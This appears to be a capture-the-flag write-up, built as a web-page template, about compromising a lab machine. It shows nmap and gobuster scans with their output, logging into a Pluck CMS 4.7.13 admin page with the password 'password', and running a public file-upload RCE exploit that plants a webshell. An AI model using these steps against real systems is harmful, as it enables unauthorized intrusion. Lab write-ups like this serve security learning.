{% from "macros.html" import console, image, text, code, list, link, header, script, imageModal %}

{{imageModal()}}

{{header("Enumeration", "enumeration")}}

{{text("We start off by scanning all the ports.")}}

{{console("nmap -T5 -p- 10.10.2.104", "Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-26 04:47 CET
Host is up (0.082s latency).
Not shown: 62276 closed tcp ports (conn-refused), 3257 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 552.74 seconds
")}}

{{text("We discover 2 open ports: ")}}

{{list(['22 (SSH)', '80 (HTTP)'])}}

{{text("We visit the website on port 80.")}}

{{image("../../static/writeups/lookup/images/000001.jpg")}}

{{text("It is a default page for Apache2. I tried looking at the source code to check if it maybe was modified, but that wasn't the case.")}}

{{text("Let's proceed by scanning for any directories.")}}

{{console("gobuster dir -u http://10.10.2.104 -w /usr/share/wordlists/dirb/common.txt", "===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.2.104
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/.htaccess            (Status: 403) [Size: 276]
/app                  (Status: 301) [Size: 308] [--> http://10.10.2.104/app/]
/index.html           (Status: 200) [Size: 10918]
/server-status        (Status: 403) [Size: 276]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================")}}

{{text("We find the <code class='bg-gray-300 rounded-md px-1'>app</code> directory in which we find a <code class='bg-gray-300 rounded-md px-1'>pluck</code> folder.")}}

{{image("../../static/writeups/lookup/images/000002.jpg")}}

{{text("By clicking on the folder, we get redirected to <code class='bg-gray-300 rounded-md px-1'>/app/pluck-4.7.13/?file=dreaming</code> page that has nothing of interest.")}}

{{image("../../static/writeups/lookup/images/000003.jpg")}}

{{text("We continue with directory scanning.")}}

{{console("gobuster dir -u http://10.10.2.104/app/pluck-4.7.13 -w /usr/share/wordlists/dirb/common.txt", "===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.2.104/app/pluck-4.7.13
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 276]
/.hta                 (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/admin.php            (Status: 200) [Size: 3741]
/data                 (Status: 301) [Size: 326] [--> http://10.10.2.104/app/pluck-4.7.13/data/]
/docs                 (Status: 301) [Size: 326] [--> http://10.10.2.104/app/pluck-4.7.13/docs/]
/files                (Status: 301) [Size: 327] [--> http://10.10.2.104/app/pluck-4.7.13/files/]
/images               (Status: 301) [Size: 328] [--> http://10.10.2.104/app/pluck-4.7.13/images/]
/index.php            (Status: 302) [Size: 0] [--> http://10.10.2.104/app/pluck-4.7.13/?file=dreaming]
/robots.txt           (Status: 200) [Size: 47]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================")}}

{{text("I tried going to <code class='bg-gray-300 rounded-md px-1'>/admin.php</code> but instead I got redirected to <code class='bg-gray-300 rounded-md px-1'>login.php</code> because I wasn't logged in. It contained a form with a password field into which I typed most common passwords I could think of and <code class='bg-gray-300 rounded-md px-1'>password</code> as password worked.")}}

{{image("../../static/writeups/lookup/images/000004.jpg")}}

{{text("After that I started searching for an exploit for <code class='bg-gray-300 rounded-md px-1'>pluck 4.7.13</code>")}}

{{link("https://www.exploit-db.com/exploits/49909", "", "Pluck CMS 4.7.13 - File Upload Remote Code Execution (Authenticated)")}}

{{text("This should allow us to get a reverse shell on the target.")}}

{{text("We save the exploit into a file and run it with the correct arguments.")}}

{{console("python3 exploit.py 10.10.2.104 80 password /app/pluck-4.7.13", "Authentification was succesfull, uploading webshell

Uploaded Webshell to: http://10.10.2.104:80/app/pluck-4.7.13/files/shell.phar
")}}

{{text("We now go to the provided URL, and have a functioning reverse shell.")}}

{{image("../../static/writeups/lookup/images/000005.jpg")}}
